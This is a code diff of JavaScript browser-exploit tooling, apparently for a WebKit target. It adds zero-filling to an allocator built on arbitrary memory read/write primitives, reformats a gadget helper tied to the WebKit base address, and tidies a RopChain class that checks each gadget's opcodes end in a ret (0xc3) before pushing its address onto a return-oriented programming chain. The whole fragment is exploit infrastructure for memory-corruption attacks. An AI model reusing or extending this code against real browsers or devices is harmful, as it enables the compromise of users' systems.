@@ -12,6 +12,19 @@ function Storage() {
 
     this.alloc = function(size) {
         var ret = this.addr
+        if (size % 8 == 0) {
+            for (var i = 0; i < size; i += 8) {
+                write64(this.addr.add(i), new dcodeIO.Long(0, 0))
+            }
+        } else if (size % 4 == 0) {
+            for (var i = 0; i < size; i += 4) {
+                write32(this.addr.add(i), 0)
+            }
+        } else {
+            for (var i = 0; i < size; i += 1) {
+                write8(this.addr.add(i), 0)
+            }
+        }
         this.addr = this.addr.add(size)
         return ret;
     }
@@ -37,15 +50,14 @@ function gadget(module, offset, machine) {
             return webkit_base_addr;
         else return 0;
     }
-    
-    if(machine) {
+
+    if (machine) {
         this.machine = machine;
     }
 }
 
-function check(ptr, array)
-{
-  
+function check(ptr, array) {
+
 }
 
 function RopChain() {
@@ -54,19 +66,21 @@ function RopChain() {
     this.add = function(instr) {
         if (typeof(instr) === "string") {
             var gadget = gadgets[instr];
-            if(typeof(gadget) === 'undefined') {
-              throw "Gadget "+instr+" was not found";
+            if (typeof(gadget) === 'undefined') {
+                throw "Gadget " + instr + " was not found";
             }
-            if(typeof(gadget.machine) != "undefined") {
+            if (typeof(gadget.machine) != "undefined") {
                 var tmp = [];
                 var valid = true;
-                for(var i = 0; i < gadget.machine.length; i++){
-                    if((tmp[tmp.length] = read8(gadget.addr().add(i))) != gadget.machine[i]) valid = false;
+                for (var i = 0; i < gadget.machine.length; i++) {
+                    if ((tmp[tmp.length] = read8(gadget.addr().add(i))) != gadget.machine[i]) valid = false;
                 }
                 var ret = read8(gadget.addr().add(gadget.machine.length));
-                if(ret != 0xc3) valid = false;
-                if(!valid){
-                  throw "Opcode invalid in "+instr+" got "+tmp.reduce(function(p,c){ return p+c.toString(16)+' '},"")+ret.toString(16)
+                if (ret != 0xc3) valid = false;
+                if (!valid) {
+                    throw "Opcode invalid in " + instr + " got " + tmp.reduce(function(p, c) {
+                        return p + c.toString(16) + ' '
+                    }, "") + ret.toString(16)
                 }
             }
             this.rop_chain.push(gadget.addr().getLowBitsUnsigned())
